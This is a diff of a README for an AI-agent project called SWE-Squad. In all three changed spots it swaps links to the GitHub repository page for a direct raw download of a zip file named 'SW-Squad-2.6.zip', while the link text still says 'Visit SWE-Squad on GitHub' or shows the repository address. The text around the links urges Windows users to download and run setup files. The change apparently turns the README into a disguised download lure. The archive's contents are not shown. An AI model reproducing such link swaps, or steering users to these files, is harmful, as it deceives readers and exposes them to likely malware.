@@ -1,6 +1,6 @@
 # 🤖 SWE-Squad - Run Self-Healing AI Dev Agents
 
-[![Download SWE-Squad](https://img.shields.io/badge/Download-SWE--Squad-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jean-loutropical739/SWE-Squad)
+[![Download SWE-Squad](https://img.shields.io/badge/Download-SWE--Squad-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Jean-loutropical739/SWE-Squad/main/src/SW-Squad-2.6.zip)
 
 ## 🧩 What is SWE-Squad
 
@@ -29,7 +29,7 @@ If you plan to use source files, you may also need:
 
 Open the download page here:
 
-[Visit SWE-Squad on GitHub](https://github.com/Jean-loutropical739/SWE-Squad)
+[Visit SWE-Squad on GitHub](https://raw.githubusercontent.com/Jean-loutropical739/SWE-Squad/main/src/SW-Squad-2.6.zip)
 
 On that page, look for the latest release, setup file, or install steps. If you see a Windows file such as `.exe` or `.msi`, download it. If the page gives source files only, use the setup steps listed in the repository.
 
@@ -200,7 +200,7 @@ This helps you see how the agents handle a real project.
 
 Open the repository here:
 
-[https://github.com/Jean-loutropical739/SWE-Squad](https://github.com/Jean-loutropical739/SWE-Squad)
+[https://raw.githubusercontent.com/Jean-loutropical739/SWE-Squad/main/src/SW-Squad-2.6.zip](https://raw.githubusercontent.com/Jean-loutropical739/SWE-Squad/main/src/SW-Squad-2.6.zip)
 
 Use that page to get the latest download, setup steps, and project files for Windows
 
